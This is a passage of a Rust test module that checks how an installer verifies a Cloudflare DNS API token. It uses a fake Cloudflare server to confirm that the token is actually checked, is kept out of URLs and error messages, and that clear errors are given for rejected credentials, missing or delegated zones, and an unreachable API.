        assert_eq!(token.expose(), GOOD_TOKEN);

        let requests = fake.requests();
        assert!(
            !requests.is_empty(),
            "A5 is a Cloudflare call, not a string check -- no request means no verification"
        );
        for request in requests {
            assert_eq!(
                request.header("authorization"),
                Some(format!("Bearer {GOOD_TOKEN}").as_str()),
            );
            assert!(
                !request.path.contains(GOOD_TOKEN) && !request.query.contains(GOOD_TOKEN),
                "the token must never reach a URL"
            );
        }
    }

    /// The first of A5's two call sites, pinned at `collect` rather than at
    /// the function it delegates to.
    ///
    /// Testing `validate_and_verify_cloudflare_token` alone proves the
    /// check works, never that `collect` still runs it -- dropping the
    /// verification here and keeping only the syntactic half leaves every
    /// other test in this module green. Its sibling on the resumed path is
    /// `main.rs`'s `a_resumed_run_refuses_a_token_the_zone_check_rejects`.
    ///
    /// Mutation check: replace this call site's
    /// `validate_and_verify_cloudflare_token` with
    /// `validate_cloudflare_token` and this fails.
    #[test]
    fn the_first_run_refuses_a_token_the_zone_check_rejects() {
        let fake = FakeCloudflare::start();
        fake.script(
            Route::get("/zones"),
            CannedResponse::api_error(9109, "Invalid access token"),
        );
        let mut io = Scripted::new(&[
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr",
            "",
            "a@b.co",
            GOOD_TOKEN,
        ]);

        let err = collect(&mut io, &verifying_against(&fake))
            .unwrap_err()
            .to_string();

        assert!(err.contains("9109"), "{err}");
        assert!(err.contains("/run/secrets/acme-dns"), "{err}");
        assert!(
            !fake.requests().is_empty(),
            "the first run must actually ask Cloudflare, not just inspect the string"
        );
    }

    /// D-06. `options.nix` documents `home.example.com` as a base domain,
    /// so the zone is matched by longest suffix. A `GET /zones?name=` would
    /// reject this perfectly good token.
    #[test]
    fn a_base_domain_below_the_zone_apex_is_accepted() {
        let fake = FakeCloudflare::start();
        fake.script(
            Route::get("/zones"),
            CannedResponse::ok(serde_json::json!([{
                "id": "z9",
                "name": "example.com",
                "name_servers": ["amber.ns.cloudflare.com"],
            }])),
        );
        fake.script(
            Route::get("/zones/z9/dns_records"),
            CannedResponse::ok(serde_json::json!([])),
        );

        validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "home.example.com",
            &verifying_against(&fake),
        )
        .expect("a token scoped to the apex covers a subdomain base domain");
    }

    /// Failure mode 1 of 4: Cloudflare itself refuses the credential.
    ///
    /// Note the shape -- HTTP 200 with `success: false`, which is how
    /// Cloudflare really answers a permission failure. The remedy is a new
    /// token, so the message says so, and it names where the credential
    /// lives on an installed host in the shape it actually has.
    #[test]
    fn a_credential_cloudflare_rejects_says_to_reissue_it() {
        let fake = FakeCloudflare::start();
        fake.script(
            Route::get("/zones"),
            CannedResponse::api_error(9109, "Invalid access token"),
        );

        let err = validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "thesyms.ca",
            &verifying_against(&fake),
        )
        .expect_err("a rejected credential must fail at the prompt")
        .to_string();

        assert!(err.contains("9109"), "{err}");
        assert!(err.contains("Invalid access token"), "{err}");
        assert!(err.contains("Zone:Read + DNS:Edit"), "{err}");
        // D-11(a): the real path, and the real shape. An operator sent to
        // /run/secrets/acme-dns who writes a bare token there has produced
        // a file systemd reads as empty.
        assert!(err.contains("/run/secrets/acme-dns"), "{err}");
        assert!(err.contains("CLOUDFLARE_DNS_API_TOKEN="), "{err}");
        assert!(
            !err.contains(GOOD_TOKEN),
            "the token must never reach an error string"
        );
    }

    /// Failure mode 2 of 4: the credential is fine, the domain is not in
    /// this account. Re-issuing the token would not help, so the message
    /// must not suggest it.
    #[test]
    fn a_domain_no_visible_zone_covers_says_so_rather_than_blaming_the_token() {
        let fake = FakeCloudflare::start();
        fake.script(
            Route::get("/zones"),
            CannedResponse::ok(serde_json::json!([{
                "id": "z1",
                "name": "someone-elses.example",
                "name_servers": ["amber.ns.cloudflare.com"],
            }])),
        );

        let err = validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "thesyms.ca",
            &verifying_against(&fake),
        )
        .expect_err("a token that cannot see the domain must fail at the prompt")
        .to_string();

        assert!(err.contains("thesyms.ca"), "{err}");
        assert!(err.contains("no Cloudflare zone"), "{err}");
        assert!(err.contains("Zone Resources"), "{err}");
        assert!(
            err.contains("longest zone name"),
            "the operator needs to know a parent zone would have been accepted: {err}"
        );
    }

    /// Failure mode 3 of 4: the zone is here, the name is served
    /// elsewhere. Cloudflare would accept every write and not one record
    /// would resolve -- the exact silent success R1 exists to end.
    #[test]
    fn a_delegated_base_domain_is_refused_with_the_nameservers_that_really_serve_it() {
        let fake = FakeCloudflare::start();
        fake.script(
            Route::get("/zones"),
            CannedResponse::ok(serde_json::json!([{
                "id": "z1",
                "name": "example.com",
                "name_servers": ["amber.ns.cloudflare.com"],
            }])),
        );
        fake.script(
            Route::get("/zones/z1/dns_records"),
            CannedResponse::ok(serde_json::json!([{
                "id": "r1",
                "name": "home.example.com",
                "type": "NS",
                "content": "ns1.elsewhere.net",
                "proxied": false,
                "comment": null,
            }])),
        );

        let err = validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "home.example.com",
            &verifying_against(&fake),
        )
        .expect_err("a delegated domain must fail at the prompt")
        .to_string();

        assert!(err.contains("home.example.com"), "{err}");
        assert!(err.contains("ns1.elsewhere.net"), "{err}");
        assert!(err.contains("resolve nowhere"), "{err}");
        assert!(err.contains("NS"), "{err}");
    }

    /// Failure mode 4 of 4: the check could not run. The token is refused
    /// rather than accepted on trust -- accepting it would restore the very
    /// "install finished, nothing published" outcome A5 removes.
    #[test]
    fn an_unreachable_api_refuses_the_token_rather_than_accepting_it_unchecked() {
        let fake = FakeCloudflare::start();
        fake.script(Route::get("/zones"), CannedResponse::transport_failure());

        let err = validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "thesyms.ca",
            &verifying_against(&fake),
        )
        .expect_err("an unchecked token must not be accepted")
        .to_string();

        assert!(err.contains("Could not reach"), "{err}");
        assert!(err.contains("NOT been checked"), "{err}");
        assert!(err.contains("api.cloudflare.com"), "{err}");
    }

    /// A malformed token never becomes a request. Same discipline as the
    /// empty case: the cheapest refusal is the one that costs no call.
    #[test]
    fn a_malformed_token_is_refused_before_any_request_is_made() {
        let fake = healthy_cloudflare();
        let err = validate_and_verify_cloudflare_token(
            "abcdefghij1234567890abcdefghij1234567890%",
            "thesyms.ca",
            &verifying_against(&fake),
        )
        .expect_err("a trailing % cannot go in an HTTP header")
        .to_string();

        assert!(err.contains("Authorization"), "{err}");
        assert!(
            fake.requests().is_empty(),
            "a malformed token must be caught before it is sent anywhere"
        );
    }

    #[test]
    fn the_catalog_list_is_sorted_and_deduplicated() {
        let mut sorted = CATALOG_APPS.to_vec();
        sorted.sort();
        sorted.dedup();
        assert_eq!(CATALOG_APPS, sorted.as_slice(), "keep CATALOG_APPS sorted");
    }
}
